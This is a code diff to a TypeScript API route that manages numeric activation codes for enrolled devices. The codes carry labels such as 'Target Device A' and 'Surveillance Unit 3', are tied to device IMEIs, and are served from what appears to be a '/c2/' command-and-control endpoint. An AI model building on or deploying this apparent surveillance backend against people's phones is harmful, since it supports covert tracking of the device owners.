@@ -65,31 +65,85 @@ interface DeviceRecord {
 
 let registeredDevices: Record<string, DeviceRecord> = {};
 
+export interface ActivationCodeRecord {
+  code: string;       // Purely numerical (e.g. "84920153")
+  name: string;       // Name / Label (e.g. "Officer Wasim", "Target 01")
+  createdAt: string;
+  status: "active" | "used";
+  usedByDevice?: string;
+}
+
 // Helper: load activation codes
-function getActivationCodes(): string[] {
+function getActivationCodeRecords(): ActivationCodeRecord[] {
   try {
     if (fs.existsSync(ACTIVATION_CODES_FILE)) {
       const data = JSON.parse(fs.readFileSync(ACTIVATION_CODES_FILE, "utf-8"));
-      if (Array.isArray(data) && data.length > 0) return data;
+      if (Array.isArray(data) && data.length > 0) {
+        // Normalize if legacy array of strings
+        return data.map((item: any, idx: number) => {
+          if (typeof item === "string") {
+            const numOnly = item.replace(/\D/g, "") || (10012026 + idx).toString();
+            return {
+              code: numOnly,
+              name: "Target " + numOnly.slice(-4),
+              createdAt: new Date().toISOString(),
+              status: "active"
+            };
+          }
+          return {
+            ...item,
+            code: (item.code || "").toString().replace(/\D/g, "") || (10012026 + idx).toString(),
+            name: item.name || "Target Device",
+            status: item.status || "active"
+          };
+        });
+      }
     }
   } catch (e) {}
-  const defaults = ["KPTS-2026-LIVE", "KPTS-HQ-001", "KPTS-INTEL-99", "ACT-4455-8899"];
+
+  // Purely numerical default codes
+  const defaults: ActivationCodeRecord[] = [
+    { code: "10012026", name: "HQ Field Unit 1", createdAt: new Date().toISOString(), status: "active" },
+    { code: "84920153", name: "Target Device A", createdAt: new Date().toISOString(), status: "active" },
+    { code: "77492018", name: "Intel Special Ops", createdAt: new Date().toISOString(), status: "active" },
+    { code: "39201847", name: "Surveillance Unit 3", createdAt: new Date().toISOString(), status: "active" }
+  ];
+
   try {
     fs.writeFileSync(ACTIVATION_CODES_FILE, JSON.stringify(defaults, null, 2));
   } catch (e) {}
   return defaults;
 }
 
-// Helper: save new activation code
-function saveActivationCode(code: string): string[] {
-  const codes = getActivationCodes();
-  if (!codes.includes(code)) {
-    codes.unshift(code);
-    try {
-      fs.writeFileSync(ACTIVATION_CODES_FILE, JSON.stringify(codes, null, 2));
-    } catch (e) {}
+function getActivationCodes(): string[] {
+  return getActivationCodeRecords().map(r => r.code);
+}
+
+// Helper: save new numerical activation code with name
+function saveActivationCode(code: string, name?: string): ActivationCodeRecord[] {
+  const records = getActivationCodeRecords();
+  // Ensure code is strictly numerical
+  const cleanCode = code.replace(/\D/g, "") || Math.floor(10000000 + Math.random() * 90000000).toString();
+  const existingIndex = records.findIndex(r => r.code === cleanCode);
+  const targetName = name?.trim() || `Target ${cleanCode.slice(-4)}`;
+
+  if (existingIndex >= 0) {
+    if (name?.trim()) {
+      records[existingIndex].name = targetName;
+    }
+  } else {
+    records.unshift({
+      code: cleanCode,
+      name: targetName,
+      createdAt: new Date().toISOString(),
+      status: "active"
+    });
   }
-  return codes;
+
+  try {
+    fs.writeFileSync(ACTIVATION_CODES_FILE, JSON.stringify(records, null, 2));
+  } catch (e) {}
+  return records;
 }
 
 // Helper: Record log entry safely
@@ -250,6 +304,7 @@ export async function GET(request: Request) {
       connected_count: connectedCount,
       total_devices_count: deviceList.length,
       activation_codes: getActivationCodes(),
+      activation_records: getActivationCodeRecords(),
       app_endpoint: "https://kpts.com.pk/c2/",
       logs: logs
     });
@@ -416,8 +471,14 @@ export async function POST(request: Request) {
         imei: imei
       };
 
-      // Ensure code is in activation codes list
-      saveActivationCode(activationCode);
+      // Ensure code is in activation codes list and mark as used
+      const records = saveActivationCode(activationCode, undefined);
+      const recIdx = records.findIndex(r => r.code === activationCode.replace(/\D/g, ""));
+      if (recIdx >= 0) {
+        records[recIdx].status = "used";
+        records[recIdx].usedByDevice = imei;
+        try { fs.writeFileSync(ACTIVATION_CODES_FILE, JSON.stringify(records, null, 2)); } catch (e) {}
+      }
 
       await recordLog({
         type: "device_activation",
@@ -617,10 +678,48 @@ export async function POST(request: Request) {
     }
 
     if (action === "generate_activation_code") {
-      const randomSuffix = Math.floor(1000 + Math.random() * 9000);
-      const newCode = `KPTS-${Date.now().toString().slice(-4)}-${randomSuffix}`;
-      const updatedCodes = saveActivationCode(newCode);
-      return NextResponse.json({ success: true, new_code: newCode, activation_codes: updatedCodes });
+      // Generate a purely NUMERICAL 8-digit code (no letters/dashes)
+      const newCode = Math.floor(10000000 + Math.random() * 90000000).toString();
+      const codeName = body.name?.trim() || `Target ${newCode.slice(-4)}`;
+      const updatedRecords = saveActivationCode(newCode, codeName);
+      return NextResponse.json({
+        success: true,
+        new_code: newCode,
+        name: codeName,
+        activation_codes: updatedRecords.map(r => r.code),
+        activation_records: updatedRecords
+      });
+    }
+
+    if (action === "add_activation_code") {
+      // Add a custom numerical code with a name
+      const rawCode = (body.code || "").toString().replace(/\D/g, "");
+      if (!rawCode) {
+        return NextResponse.json({ error: "Code must be numerical only" }, { status: 400 });
+      }
+      const codeName = body.name?.trim() || `Target ${rawCode.slice(-4)}`;
+      const updatedRecords = saveActivationCode(rawCode, codeName);
+      return NextResponse.json({
+        success: true,
+        new_code: rawCode,
+        name: codeName,
+        activation_codes: updatedRecords.map(r => r.code),
+        activation_records: updatedRecords
+      });
+    }
+
+    if (action === "delete_activation_code") {
+      const targetCode = (body.code || "").toString().replace(/\D/g, "");
+      let records = getActivationCodeRecords();
+      records = records.filter(r => r.code !== targetCode);
+      try {
+        fs.writeFileSync(ACTIVATION_CODES_FILE, JSON.stringify(records, null, 2));
+      } catch (e) {}
+      return NextResponse.json({
+        success: true,
+        activation_codes: records.map(r => r.code),
+        activation_records: records
+      });
     }
 
     if (action === "update_config" && config) {
@@ -661,7 +760,8 @@ export async function POST(request: Request) {
       config: serverConfig,
       command: currentCommand,
       target_device: targetDeviceCommand,
-      activation_codes: getActivationCodes()
+      activation_codes: getActivationCodes(),
+      activation_records: getActivationCodeRecords()
     });
   } catch (error: any) {
     return NextResponse.json({ error: error.message || "Internal server error" }, { status: 500 });
